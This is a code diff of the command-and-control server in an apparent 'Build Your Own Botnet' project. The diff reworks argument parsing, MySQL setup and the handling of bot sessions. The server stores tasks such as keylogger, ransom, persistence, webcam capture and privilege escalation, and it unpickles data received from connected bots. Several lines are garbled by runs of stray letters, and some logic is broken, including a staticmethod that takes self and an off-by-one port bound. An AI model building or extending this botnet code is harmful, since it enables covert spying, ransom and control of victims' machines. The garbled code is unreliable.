@@ -74,6 +74,68 @@ __doc__         = '''
 
 '''
 
+def main():
+    parser   = argparse.ArgumentParser(
+        prog='server.py', 
+        version='0.1.3',
+        description="Command & Control Server (Build Your Own Botnet)")
+
+    server   = parser.add_argument_group('server')
+    database = parser.add_argument_group('database')
+    
+    server.add_argument(
+        '--host', 
+        action='store', 
+        type=str, 
+        default='0.0.0.0', 
+        help='server hostname or IP address')
+
+    server.add_argument(
+        '--port', 
+        action='store', 
+        type=int, 
+        default=1337, 
+        help='server port number')
+
+    database.add_argument(
+        '--mysql-host', 
+        metavar='HOST',
+        action='store', 
+        type=str, 
+        default='localhost', 
+        help='mysql hostname')
+
+    database.add_argument(
+        '--mysql-port', 
+        metavar='PORT', 
+        action='store', 
+        type=int, 
+        default=3306, 
+        help='mysql port number')
+
+    database.add_argument(
+        '--mysql-user', 
+        metavar='USER', 
+        action='store', 
+        type=str, 
+        default='root',
+        help='mysql login')
+
+    database.add_argument(
+        '--mysql-pass', 
+        metavar='PASS', 
+        action='store', 
+        type=str, 
+        default='toor', 
+        help='mysql password')
+
+    options = parser.parse_args()
+    globals()['c2'] = C2(options.host, options.port)
+    c2.database = Database(host=options.mysql_host, port=options.mysql_port, user=options.mysql_user, password=options.mysql_pass)
+    with c2._lock:
+        util.display("[+] ", color='green', style='bright', end='')
+        util.display("Connected to MySQL database", style='bright', color='reset')
+    c2.run()
 
 
 class C2():
@@ -132,29 +194,33 @@ class C2():
     _prompt_style   = colorama.Style.BRIGHT
     
 
-    def __init__(self, port=1337, **kwargs):
+    def __init__(self, host, port, **kwargs):
         """
         Create a new C2 instance
+    
+        `Required`
+        :param int port:      server port number
 
         `Optional`
         :param str host:      mysql hostname (default: localhost)
         :param str user:      mysql username (default: root)
         :param str password:  mysql password (default: toor)
         """
+        assert (isinstance(port, int) and port > 0 and port < 65356), "invalid port number - must be integer 1-65355" 
         self._count             = 1
         self._prompt            = None
         self._created           = time.time()
         self._active            = threading.Event()
         self.sessions           = {}
         self.current_session    = None
+        self.host               = host
         self.port               = port
         self.commands           = self._init_commands()
         self.banner             = self._init_banner()
-        self.database           = self._init_database()
         
 
     @staticmethod
-    def _error(data):
+    def _error(self, data):
         lock = self.current_session.lock if self.current_session else self._lock
         with lock:
             util.display('[-] ', color='red', style='dim', end='')
@@ -242,17 +308,6 @@ class C2():
             }
 
 
-    def _init_database(self, **kwargs):
-        if all([kwargs.get(arg) for arg in ['host','user','password']]):
-            db = Database(server=self, **kwargs)
-        else:
-            db = Database(server=self)
-        with self._lock:
-            util.display("[+] ", color='green', style='bright', end='')
-            util.display("Connected to MySQL database", style='bright', color='reset')
-        return db
-    
-
     def _get_sessions(self):
         return [v for v in self.sessions.values()]
 
@@ -294,7 +349,7 @@ class C2():
         sock.listen(10)
         while True:
             connection, address = sock.accept()
-            session = Session(server=self, connection=connection, name=self._count)
+            session = Session(connection=connection, name=self._count)
             self.sessions[self._count] = session
             self._count  += 1
             session.start()                        
@@ -803,13 +858,12 @@ class Database(mysql.connector.MySQLConnection):
     
     """
 
-    def __init__(self, host='localhost', user='root', password='toor', server=None, tasks=['escalate','keylogger','outlook','packetsniffer','persistence','phone','portscan','process','ransom','screenshot','webcam'], **kwargs):
+    def __init__(self, host='localhost', user='root', password='toor', tasks=['escalate','keylogger','outlook','packetsniffer','persistence','phone','portscan','process','ransom','screenshot','webcam'], **kwargs):
 
         """
         Create new MySQL conection instance and setup the database
 
-        `Required`
-        :param server:          byob.server.Server instance
+        `Required` 
         :param str host:        hostname/IP address of MySQL host machine
         :param str user:        authorized account username
         :param str password:    authorized account password
@@ -817,12 +871,10 @@ class Database(mysql.connector.MySQLConnection):
         `Optional`
         :param list tasks:      list of commands/modules for database to store
         """
-        assert isinstance(server, C2), "argument 'server' must be a byob.C2 instance"
         try:
             super(Database, self).__init__(host=host, user=user, password=password)
             self.config(host=host, user=user, password=password)
             self.query      = self.cursor(dictionary=True)
-            self._server    = server
             self._tasks     = tasks
             self._debug     = globals().get('_debug')
             self._color     = globals().get('_color')
@@ -927,7 +979,7 @@ class Database(mysql.connector.MySQLConnection):
         Print error output to console
         
         """
-        self._server._error(str(output))
+        globals()['_debugger'].error(str(output))
 
 
     def update_status(self, session, online):
@@ -1161,7 +1213,7 @@ class Session(threading.Thread):
         keep the socket connection alive
 
     """
-    def __init__(self, connection=None, server=None, id=1):
+    def __init__(self, connection=None, id=1):
         """
         Create a new Session instance
 
@@ -1172,7 +1224,6 @@ class Session(threading.Thread):
         
         """
         super(Session, self).__init__()
-        self._server    = server
         self._prompt    = None
         self._active    = threading.Event()
         self._created   = time.time()
@@ -1315,11 +1366,11 @@ class TaskHandler(SocketServer.StreamRequestHandler):
                     break
                 size = struct.unpack('!L', bits)[0]
                 buff = self.connection.recv(size)
-                while len(buff) < size:zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+                while len(buff) < size:
                     buff += self.connection.recv(size - len(buff))
-   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa             task = pickle.loads(buff)
+                task = pickle.loads(buff)
                 if isinstance(task, dict):
-                    self._server.database.handle_task(task)
+                    globals()['c2'].database.handle_task(task)
                 else:
                     globals()['_debugger'].debug(str(e))
             except Exception as e:
@@ -1368,28 +1419,6 @@ class Server(SocketServer.ThreadingTCPServer):
             abort = self.abort
             if abort:
                 break
-
-
-def main():
-    parser   = argparse.ArgumentParser(prog='server.py', description="Command & Control Server (Build Your Own Botnet)", version='0.1.3')
-    server   = parser.add_argument_group('server')
-    database = parser.add_argument_group('database')
-    server.add_argument('--host', dest='server_host', metavar='HOST', action='store', type=str, default='0.0.0.0', help='server hostname or IP address')
-    server.add_argument('--port', dest='server_port', metavar='PORT', action='store', type=int, default=1337, help='server port number')
-    database.add_argument('--mysql-host', dest='host', metavar='HOST', action='store', type=str, default='localhost', help='mysql hostname')
-    database.add_argument('--mysql-port', dest='port', metavar='PORT', action='store', type=int, default=3306, help='mysql port number')
-    database.add_argument('--mysql-user', dest='user', metavar='USER', action='store', type=str, default='root', help='mysql login')
-    database.add_argument('--mysql-pass', dest='pass', metavar='PASS', action='store', type=str, default='toor', help='mysql password')
-
-    try:
-        options = parser.parse_args()   
-        globals()['c2']  = C2(options)
-        globals()['c2'].run()
-    except Exception as e:
-        util.display("\n[-] ", color='red', style='bright', end='')
-        util.display("Error: {}\n".format(str(e)), color='reset', style='dim')
-        parser.print_help()
-        sys.exit(0)
 
 if __name__ == '__main__':
     main()
